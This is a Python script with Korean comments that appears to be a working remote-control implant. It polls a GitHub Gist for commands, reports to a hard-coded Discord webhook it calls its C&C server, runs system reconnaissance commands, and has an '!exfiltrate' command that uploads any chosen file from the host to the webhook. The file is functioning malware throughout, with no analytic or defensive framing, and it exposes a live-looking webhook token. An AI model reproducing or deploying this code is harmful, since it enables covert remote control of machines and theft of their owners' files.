import requests
import subprocess
import os
import time
import json

# URL 하드코딩해놓음. 여기다가 똑같이 붙여넣으면 댐 ㅇㅇ
#비상!!!! gist를 업데이트하면 링크가 바뀌어버림... 다른 방법을 모색해봐야할듯 ㅇㅇ
GIST_COMMAND_URL = "https://gist.githubusercontent.com/ggongsik/e2a2d45b7a60dc9edeba10cadf7d6901/raw/0d107d534f167e694ff49593e6995fb33b21afbf/cmd.txt"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1397491964445851721/psvqsPSZD4Ha9l6zV22oP3atdw1t5R-idP3os8i-Rgt_OZDoSp7t2kGdt7EJ-EDCFw01"

# 마지막으로 실행한 명령을 저장하여, 동일한 명령이 반복 실행되는 것을 방지
last_command = ""

# 15초마다 새로운거 못가져오는거 같아서 로직 다시 손봄
def get_command(url):
    """Gist에서 명령을 가져옵니다. (캐시 지우고 다시 가져옴)"""
    try:
        # 캐시 제어 헤더 추가
        headers = {
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        # 헤더를 포함하여 GET 요청을 보냄.
        response = requests.get(url, headers=headers, timeout=5)
        response.raise_for_status()  # HTTP 오류 발생 시 예외 발생
        return response.text.strip()
    except requests.RequestException as e:
        # 오류 발생 시 로그를 남기고 빈 문자열을 반환할 수 있습니다.
        # 이 부분은 send_result_to_discord를 호출하지 않아, 네트워크 오류로 인한 무한 루프를 방지합니다.
        print(f"Error fetching command: {e}")
        return last_command # 오류 발생 시 이전 명령을 반환하여 루프가 비정상적으로 돌지 않게 함

def send_result_to_discord(webhook_url, message, file_path=None):
    """명령 실행 결과나 파일을 Discord로 보냅니다."""
    try:
        if file_path:
            # 파일 유출
            with open(file_path, 'rb') as f:
                payload = {'content': message}
                files = {'file1': (os.path.basename(file_path), f)}
                response = requests.post(webhook_url, data=payload, files=files, timeout=10)
            return response.status_code
        else:
            # 일반 텍스트 결과
            payload = {'content': message}
            response = requests.post(webhook_url, json=payload, timeout=10)
            return response.status_code
    except Exception as e:
        print(f"Failed to send to Discord: {e}")
        return None

if __name__ == "__main__":
    # 스크립트 시작 시, C&C 서버(디스코드)에 로그남기기
    send_result_to_discord(DISCORD_WEBHOOK_URL, ">>> New agent online! Waiting for commands...")

    while True:
        command = get_command(GIST_COMMAND_URL)

        if command:
            print(f"[*] Received command: {command}")
            last_command = command  # 명령 업데이트
            
            output = ""
            if command == "!whoami":
                output = subprocess.getoutput("whoami")
            elif command == "!ipconfig" or command == "!ifconfig":
                cmd_to_run = "ipconfig" if os.name == 'nt' else "ifconfig"
                output = subprocess.getoutput(cmd_to_run)
            elif command.startswith("!exfiltrate"):
                parts = command.split(" ", 1)
                if len(parts) > 1:
                    file_to_steal = parts[1].strip()
                    if os.path.exists(file_to_steal):
                        message = f"Exfiltrating file: `{file_to_steal}`"
                        send_result_to_discord(DISCORD_WEBHOOK_URL, message, file_path=file_to_steal)
                        output = f"File `{file_to_steal}` sent."
                    else:
                        output = f"Error: File `{file_to_steal}` not found."
                else:
                    output = "Error: No file path specified for !exfiltrate."
            elif command == "!kill":
                send_result_to_discord(DISCORD_WEBHOOK_URL, ">>> Agent shutting down.")
                break
            elif not command.startswith("Error fetching command"): # 에러 메시지는 실행 결과로 보내지 않음
                output = "Unknown command."

            # 실행 결과를 Discord로 전송 (명령 에러가 아닐 경우에만)
            if not command.startswith("Error fetching command"):
                result_message = f"--- Result for `{command}` ---\n```\n{output}\n```"
                send_result_to_discord(DISCORD_WEBHOOK_URL, result_message)

        # 15초마다 Gist를 확인
        time.sleep(15)